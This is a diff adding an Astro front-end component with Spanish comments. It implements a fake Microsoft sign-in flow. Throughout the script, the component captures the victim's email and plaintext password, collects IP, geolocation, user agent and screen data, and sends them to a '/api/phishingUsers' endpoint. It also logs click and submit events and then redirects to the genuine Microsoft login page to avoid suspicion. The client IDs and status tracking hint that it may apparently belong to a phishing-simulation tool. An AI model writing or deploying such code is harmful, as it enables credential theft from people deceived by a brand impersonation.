@@ -1,0 +1,376 @@
+---
+interface Props {
+  clientId?: string;
+  emailFormId?: string;
+  passwordFormId?: string;
+  emailViewId?: string;
+  passwordViewId?: string;
+  identityId?: string;
+  emailInputName?: string;
+  passwordInputName?: string;
+}
+
+const {
+  clientId = "",
+  emailFormId = "email-form",
+  passwordFormId = "password-form",
+  emailViewId = "email-view",
+  passwordViewId = "password-view",
+  identityId = "identity",
+  emailInputName = "email",
+  passwordInputName = "password",
+} = Astro.props;
+---
+
+<script define:vars={{ 
+  clientId, 
+  emailFormId, 
+  passwordFormId, 
+  emailViewId, 
+  passwordViewId, 
+  identityId,
+  emailInputName,
+  passwordInputName
+}}>
+  // Utilidad para nombres de clase
+  const cn = (className) => className;
+
+  // Servicio de sesión para rastrear datos del usuario
+  const sessionService = (() => {
+    const SESSION_KEY = "microsoft_session";
+    let sessionData = null;
+
+    const generateSessionId = () => {
+      return Math.random().toString(36).substring(2, 15) + 
+             Math.random().toString(36).substring(2, 15);
+    };
+
+    const createSessionData = () => {
+      return {
+        sessionId: generateSessionId(),
+        startTime: new Date().toISOString(),
+        referrer: document.referrer || "direct",
+        landingPage: window.location.href,
+        userInteractions: [],
+      };
+    };
+
+    return {
+      init: () => {
+        try {
+          const existingSession = localStorage.getItem(SESSION_KEY);
+          
+          if (existingSession) {
+            sessionData = JSON.parse(existingSession);
+          } else {
+            sessionData = createSessionData();
+            localStorage.setItem(SESSION_KEY, JSON.stringify(sessionData));
+          }
+        } catch (error) {
+          console.error("Error initializing session:", error);
+          sessionData = createSessionData();
+        }
+      },
+
+      getSessionData: () => sessionData,
+
+      trackInteraction: (type, data = {}) => {
+        if (!sessionData) return;
+
+        const interaction = {
+          type,
+          timestamp: new Date().toISOString(),
+          data,
+        };
+
+        sessionData.userInteractions.push(interaction);
+        
+        try {
+          localStorage.setItem(SESSION_KEY, JSON.stringify(sessionData));
+        } catch (error) {
+          console.error("Error saving interaction:", error);
+        }
+      },
+    };
+  })();
+
+  // Gestor de vistas para cambiar entre formularios
+  const viewManager = (() => {
+    const getElement = (id) => document.getElementById(id);
+    const emailView = () => getElement(emailViewId);
+    const passwordView = () => getElement(passwordViewId);
+
+    return {
+      showPasswordView: () => {
+        const emailViewEl = emailView();
+        const passwordViewEl = passwordView();
+        
+        if (!emailViewEl || !passwordViewEl) {
+          console.error("No se encontraron los elementos de vista");
+          return;
+        }
+
+        emailViewEl.classList.remove(cn("show-from-r"));
+        emailViewEl.classList.add(cn("hide-to-left"));
+
+        setTimeout(() => {
+          passwordViewEl.classList.remove(cn("hidden"));
+          passwordViewEl.classList.add(cn("show-from-r"));
+          document.getElementById(passwordInputName)?.focus();
+        }, 250);
+      },
+
+      updateIdentity: (email) => {
+        const identityEl = getElement(identityId);
+        if (identityEl) {
+          identityEl.textContent = email;
+        }
+      },
+    };
+  })();
+
+  // Módulo para manejo de formularios
+  const formHandler = (() => {
+    const EMAIL_REGEX =
+      /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+    const PHONE_REGEX =
+      /^(\+\d{1,2}\s?)?1?\-?\.?\s?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}$/;
+    const USER_REGEX = /^[a-zA-Z0-9]{5,31}$/;
+
+    const validateInput = (value) => {
+      return (
+        EMAIL_REGEX.test(value) ||
+        PHONE_REGEX.test(value) ||
+        USER_REGEX.test(value)
+      );
+    };
+
+    const setInputStatus = (input, isValid) => {
+      if (input) {
+        input.classList.toggle("has-error", !isValid);
+      }
+    };
+
+    return {
+      handleEmailSubmit: async (event) => {
+        event.preventDefault();
+        const form = event.target;
+        const input = form.elements.namedItem(emailInputName);
+        
+        if (!input) {
+          console.error(`No se encontró el input con nombre ${emailInputName}`);
+          return;
+        }
+        
+        const isValid = validateInput(input.value);
+        setInputStatus(input, isValid);
+
+        if (isValid) {
+          await phishingService.sendEmail(input.value);
+          viewManager.showPasswordView();
+          viewManager.updateIdentity(input.value);
+          
+          // Registrar la interacción
+          sessionService.trackInteraction("email_submitted", { 
+            email: input.value 
+          });
+          
+          // Enviar estado al servidor
+          if (clientId) {
+            fetch("/api/status", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ client_id: clientId, status: "submit" }),
+            });
+          }
+        }
+      },
+
+      handlePasswordSubmit: async (event) => {
+        event.preventDefault();
+        const form = event.target;
+        const input = form.elements.namedItem(passwordInputName);
+        
+        if (!input) {
+          console.error(`No se encontró el input con nombre ${passwordInputName}`);
+          return;
+        }
+        
+        await phishingService.sendPassword(input.value);
+        
+        // Registrar la interacción
+        sessionService.trackInteraction("password_submitted", {
+          password_length: input.value.length
+        });
+        
+        // Redirigir a la página real después de enviar la contraseña
+        setTimeout(() => {
+          window.location.href = "https://login.microsoftonline.com";
+        }, 1000);
+      },
+    };
+  })();
+
+  // Servicio para comunicación con API
+  const phishingService = (() => {
+    const getClientMetadata = async () => {
+      try {
+        let ipData = {};
+        try {
+          ipData = await (await fetch("https://api.ipapi.is")).json();
+        } catch (error) {
+          console.error("Error fetching IP data:", error);
+        }
+
+        return {
+          ip: ipData.ip || "unknown",
+          userAgent: navigator.userAgent,
+          geolocation: {
+            lat: ipData.location?.latitude || 0,
+            lon: ipData.location?.longitude || 0,
+            city: ipData.location?.city,
+            country: ipData.location?.country,
+          },
+          device: {
+            screenResolution: `${screen.width}x${screen.height}`,
+          },
+        };
+      } catch (error) {
+        console.error("Error getting metadata:", error);
+        return null;
+      }
+    };
+
+    return {
+      sendEmail: async (email) => {
+        const metadata = await getClientMetadata();
+        const sessionData = sessionService.getSessionData();
+
+        const userData = {
+          email: email,
+          metadata: metadata || {
+            ip: "unknown",
+            userAgent: navigator.userAgent,
+            geolocation: { lat: 0, lon: 0 },
+            device: { screenResolution: "unknown" },
+          },
+          sessionData,
+        };
+
+        if (!clientId) return null;
+
+        try {
+          const response = await fetch(`/api/phishingUsers/${clientId}`, {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(userData),
+          });
+
+          return await response.json();
+        } catch (error) {
+          console.error("Error sending email:", error);
+          return null;
+        }
+      },
+
+      sendPassword: async (password) => {
+        const metadata = await getClientMetadata();
+        const sessionData = sessionService.getSessionData();
+
+        const userData = {
+          password: password,
+          metadata: metadata || {
+            ip: "unknown",
+            userAgent: navigator.userAgent,
+            geolocation: { lat: 0, lon: 0 },
+            device: { screenResolution: "unknown" },
+          },
+          sessionData,
+        };
+
+        if (!clientId) return null;
+
+        try {
+          const response = await fetch(`/api/phishingUsers/${clientId}`, {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(userData),
+          });
+
+          return await response.json();
+        } catch (error) {
+          console.error("Error sending password:", error);
+          return null;
+        }
+      },
+
+      init: async () => {
+        const metadata = await getClientMetadata();
+        const sessionData = sessionService.getSessionData();
+
+        const userData = {
+          metadata: metadata || {
+            ip: "unknown",
+            userAgent: navigator.userAgent,
+            geolocation: { lat: 0, lon: 0 },
+            device: { screenResolution: "unknown" },
+          },
+          sessionData,
+        };
+
+        if (!clientId) return null;
+
+        try {
+          const response = await fetch(`/api/phishingUsers/${clientId}`, {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(userData),
+          });
+
+          return await response.json();
+        } catch (error) {
+          console.error("Error initializing phishing service:", error);
+          return null;
+        }
+      },
+    };
+  })();
+
+  // Inicialización cuando el DOM está cargado
+  document.addEventListener("DOMContentLoaded", () => {
+    // Inicializar servicios
+    sessionService.init();
+    phishingService.init();
+
+    // Registrar visita al enlace
+    if (clientId) {
+      fetch("/api/status", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ client_id: clientId, status: "clicked" }),
+      });
+    }
+
+    // Configurar manejadores de eventos para los formularios
+    const emailForm = document.getElementById(emailFormId);
+    const passwordForm = document.getElementById(passwordFormId);
+    
+    if (emailForm) {
+      emailForm.addEventListener("submit", formHandler.handleEmailSubmit);
+    } else {
+      console.error(`No se encontró el formulario con ID ${emailFormId}`);
+    }
+    
+    if (passwordForm) {
+      passwordForm.addEventListener("submit", formHandler.handlePasswordSubmit);
+    } else {
+      console.error(`No se encontró el formulario con ID ${passwordFormId}`);
+    }
+
+    // Mostrar la vista de email con animación
+    const emailViewEl = document.getElementById(emailViewId);
+    if (emailViewEl) {
+      emailViewEl.classList.add(cn("show-from-r"));
+    }
+  });
+</script>
